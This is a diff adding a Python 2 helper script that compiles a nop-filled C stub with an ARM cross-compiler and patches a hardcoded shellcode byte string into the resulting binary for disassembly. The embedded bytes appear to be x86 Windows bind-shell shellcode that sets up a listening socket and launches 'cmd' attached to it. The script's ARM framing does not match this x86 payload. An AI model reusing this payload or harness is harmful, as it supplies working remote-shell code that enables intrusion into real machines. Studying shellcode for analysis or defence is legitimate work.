@@ -1,0 +1,50 @@
+'''
+install Cross compiler:
+$sudo apt-get install gcc-arm-linux-gnueabihf
+
+usage(arm):
+$python cha.py
+$arm-linux-gnueabihf-objdump -d out
+then current directory will have 'out' file, function named shellcode in 'out' is shellcode
+
+by likaiming
+'''
+
+import os
+import commands
+
+head = '''#include<stdlib.h>\n'''
+start_head = '''void shellcode(){ '''
+start_end = '''} '''
+mian_fun = '''int main(){shellcode();} '''
+nop_inst = ''
+
+shellcode = "\x55\x83\xEC\x40\x8B\xEC\xC7\x45\x04\xB8\x1B\xE4\x77\xC7\x45\x08\xDA\x41\xA2\x71\xC7\x45\x12\x01\x5A\xA2\x71\xC7\x45\x16\x8D\x3F\xA2\x71\xC7\x45\x20\xCE\x3E\xA2\x71\xC7\x45\x24\xE2\x5D\xA2\x71\xC7\x45\x28\x8D\x86\xA2\x71\x81\xEC\x00\x02\x00\x00\x54\x68\x02\x02\x00\x00\xFF\x55\x08\x81\xC4\x00\x02\x00\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x06\x6A\x01\x6A\x02\xFF\x55\x12\x8B\xD8\xB8\x01\x00\x00\x00\x50\x8B\xF4\x6A\x04\x56\x6A\x04\x68\xFF\xFF\x00\x00\x53\xFF\x55\x16\x68\x7F\x00\x00\x01\x68\x02\x00\x00\x15\x8B\xF4\x6A\x10\x56\x53\xFF\x55\x20\x6A\x02\x53\xFF\x55\x24\x6A\x10\x54\x56\x53\xFF\x55\x28\x8B\xD8\x81\xEC\x80\x00\x00\x00\x8D\x3C\x24\x33\xC0\x68\x80\x00\x00\x00\x59\xF3\xAA\x8D\x3C\x24\x66\xC7\x47\x2C\x01\x01\x89\x5F\x38\x89\x5F\x3C\x89\x5F\x40\xC7\x45\x32\x63\x6D\x64\x00\x8D\x44\x24\x44\x50\x57\x6A\x00\x6A\x00\x6A\x00\x6A\x01\x6A\x00\x6A\x00\x8D\x45\x32\x50\x6A\x00\xFF\x55\x04"
+
+def generate_new_c_file(data):
+    f = open('tmp.c', 'wb')
+    f.write(data)
+    f.close()
+
+#print(shellcode)
+#print(len(shellcode))
+
+for i in range(0,len(shellcode)):
+    nop_inst = nop_inst + '__asm__ volatile("nop");'
+generate_new_c_file(head + start_head + nop_inst + start_end + mian_fun)
+#for different arch, you should judge this command
+#os.system('gcc -nostdlib -nostartfiles -fPIC -pie -fomit-frame-pointer tmp.c -o tmp')
+os.system('arm-linux-gnueabihf-gcc -fPIC -pie -fomit-frame-pointer tmp.c -o tmp')
+pos = int(commands.getstatusoutput(''' (readelf -s tmp | grep -w shellcode | awk '{print$2}') ''')[1],16)
+#print(pos)
+ftmp = open('tmp','rb')
+fout = open('out', 'wb')
+data1 = ftmp.read(pos)
+ftmp.read(len(shellcode))
+fout.write(data1)
+fout.write(shellcode)
+data2 = ftmp.read()
+fout.write(data2)
+ftmp.close()
+fout.close()
+os.system('rm tmp tmp.c')
